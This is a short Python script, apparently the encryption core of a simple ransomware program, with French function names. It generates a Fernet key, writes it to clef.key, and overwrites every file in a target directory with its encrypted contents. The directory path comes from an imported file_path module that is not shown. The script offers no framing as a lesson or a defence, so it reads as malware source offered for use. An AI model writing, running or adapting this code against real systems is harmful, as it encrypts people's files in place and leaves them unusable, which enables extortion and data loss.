
import os 
from cryptography.fernet import Fernet

import file_path


def generation_clef() :
    clef = Fernet.generate_key()
    with open ("clef.key","wb")as key_file:
        key_file.write(clef)

def lire_clef():
    return open("clef.key","rb").read()


def chiffrement(items,clef):
    f=Fernet(clef)
    for item in items :
        with open(item,"rb")as File :
            file_data=File.read()
        encypted_data=f.encrypt(file_data)
        with open(item,"wb")as File :
            File.write(encypted_data)
        

def crypt() :
    pwd=file_path.get_path()

    items= os.listdir(pwd)

    path = [str(pwd)+'/'+ item for item in items]
    generation_clef()
    clef=lire_clef()
    chiffrement(path,clef)

